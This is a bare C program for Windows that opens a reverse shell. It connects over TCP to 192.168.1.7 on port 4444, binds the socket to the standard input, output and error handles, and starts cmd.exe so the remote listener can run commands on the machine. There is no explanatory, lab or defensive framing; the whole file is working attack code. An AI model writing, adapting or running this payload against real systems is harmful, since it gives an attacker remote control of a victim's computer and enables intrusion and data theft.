#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib") 

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in addr;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    const char* ip = "192.168.1.7";  
    int port = 4444;  

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed.\n");
        return 1;
    }

    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed.\n");
        WSACleanup();
        return 1;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        printf("Connection failed.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    for (int i = 0; i < 3; i++) {
        SetStdHandle(STD_INPUT_HANDLE + i, (HANDLE)sock);
    }

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();

    return 0;
}
